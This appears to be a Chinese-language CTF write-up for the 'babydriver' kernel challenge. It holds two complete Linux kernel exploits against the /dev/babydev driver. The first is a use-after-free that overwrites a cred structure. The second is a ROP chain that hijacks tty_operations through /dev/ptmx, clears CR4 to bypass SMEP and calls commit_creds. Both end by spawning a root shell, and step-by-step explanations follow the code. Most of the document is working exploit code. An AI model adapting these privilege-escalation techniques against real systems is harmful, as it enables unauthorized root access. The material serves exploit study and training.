### UAF

```
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/wait.h>
#include<sys/stat.h>
int main(){
    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
 
    ioctl(fd1, 0x10001, 0xa8);
 
    close(fd1);
    int id = fork();
    if(id<0){
        printf("fork error!\n");
        exit(-1);
    }
    else if(id==0){
        char cred[0x20] = {0};
        write(fd2, cred, 0x1c);
        if(getuid()==0){
            system("/bin/sh");
           exit(0);
        }
    }
    else{
        wait(NULL);
    }
    return 0;
}
```

`/dev/babydev`设备以读写方式被打开，`babyopen`函数被调用，`babydev_struct`结构体 `device_buf`被 `kmalloc`新分配一块内存空间，成员 `device_buf_len`则为内存空间大小。连续两次分配，第二次分配时 `device_buf`被覆盖成新的堆块地址。 `ioctl(fd1, 0x10001, 0xa8);`触发 `babyioctl`，`device_buf`指向重新分配0xa8同cred结构体大小的内存，`close(fd1)`触发 `babyrelease`，释放 `device_buf`指向的内存。fork调用，在分配cred结构体时分配到刚刚被释放的内存，再利用没被关闭的fd2覆盖cred结构体的uid为0，实现提权

### KROP

```
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define xchg_eax_esp_addr           0xffffffff8100008a
#define prepare_kernel_cred_addr    0xffffffff810a1810
#define commit_creds_addr           0xffffffff810a1420
#define pop_rdi_addr                0xffffffff810d238d
#define mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80
#define swapgs_pop_rbp_addr         0xffffffff81063694        
#define iretq_addr                  0xffffffff814e35ef

void set_root_cred(){
    void* (*prepare_kernel_cred)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
    void (*commit_creds)(void*) = (void (*)(void*))commit_creds_addr;

    void * root_cred = prepare_kernel_cred(NULL);
    commit_creds(root_cred);
}

void get_shell() {
    printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
    system("/bin/sh");
}


size_t user_cs, user_eflags, user_rsp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );
    puts("[*]status has been saved.");
}

int main() {
    save_status();
    printf(
        "[+] iret data saved.\n"
        "    user_cs: %ld\n"
        "    user_eflags: %ld\n"
        "    user_rsp: %p\n"
        "    user_ss: %ld\n",
        user_cs, user_eflags, (char*)user_rsp, user_ss
    );

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, 65537, 0x2e0);

    close(fd1);

    // 申请 tty_struct
    int master_fd = open("/dev/ptmx", O_RDWR);

    // 构造一个 fake tty_operators
    u_int64_t fake_tty_ops[] = {
        0, 0, 0, 0, 0, 0, 0,
        xchg_eax_esp_addr, // int  (*write)(struct tty_struct*, const unsigned char *, int)
    };
    printf("[+] fake_tty_ops constructed\n");

    u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
    printf("[+] hijacked_stack addr: %p\n", (char*)hijacked_stack_addr);

    char* fake_stack = NULL;
    if ((fake_stack = mmap(
            (char*)((hijacked_stack_addr & (~0xffff))),  // addr, 页对齐
            0x10000,                                     // length
            PROT_READ | PROT_WRITE,                     // prot
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,    // flags
            -1,                                         // fd
            0)                                          // offset
        ) == MAP_FAILED)  
        perror("mmap");
  
    printf("[+]     fake_stack addr: %p\n", fake_stack);

    u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
    int idx = 0;
    hijacked_stack_ptr[idx++] = pop_rdi_addr;              // pop rdi; ret
    hijacked_stack_ptr[idx++] = 0x6f0;
    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
    hijacked_stack_ptr[idx++] = 0;                         // dummy
    hijacked_stack_ptr[idx++] = (u_int64_t)set_root_cred;
    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;
    hijacked_stack_ptr[idx++] = 0;                          // dummy
    hijacked_stack_ptr[idx++] = iretq_addr;
    hijacked_stack_ptr[idx++] = (u_int64_t)get_shell;       // iret_data.rip
    hijacked_stack_ptr[idx++] = user_cs;
    hijacked_stack_ptr[idx++] = user_eflags;
    hijacked_stack_ptr[idx++] = user_rsp+0x8;
    hijacked_stack_ptr[idx++] = user_ss;

    printf("[+] privilege escape ROP prepared\n");

    // 读取 tty_struct 结构体的所有数据
    int ops_ptr_offset = 4 + 4 + 8 + 8;
    char overwrite_mem[ops_ptr_offset + 8];
    char** ops_ptr_addr = (char**)(overwrite_mem + ops_ptr_offset);

    read(fd2, overwrite_mem, sizeof(overwrite_mem));
    printf("[+] origin ops ptr addr: %p\n", *ops_ptr_addr);

    // 修改并覆写 tty_struct 结构体
    *ops_ptr_addr = (char*)fake_tty_ops;
    write(fd2, overwrite_mem, sizeof(overwrite_mem));
    printf("[+] hacked ops ptr addr: %p\n", *ops_ptr_addr);
  
    // 触发 tty_write
    // 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT
    int buf[] = {0};
    write(master_fd, buf, 8);

    return 0;
}
```

1. 保存用户态的寄存器
2. 同UAF，申请一块大小和tty结构体大小相同的内存
3. 申请tty_struct
4. 构造一个 fake tty_operators
   ```
   在tty_write的调用过程中，发现只有rax是可用的，即tty_operations结构体所在的内存地址，所以我们可以使用xchg eax,rsp;ret;指令劫持栈到rax的低四字节处，接着在rax低四字节处用布置rop链（先在内存对齐处mmap分配空间）
   ```
5. 通过UAF改变tty_operators指针，然后调用write，跳转到 `xchg eax,rsp;ret;` 指令，跳转到rop链
6. rop链通过改变cr4寄存器关闭smep保护，执行函数改变uid，返回用户态，getshell
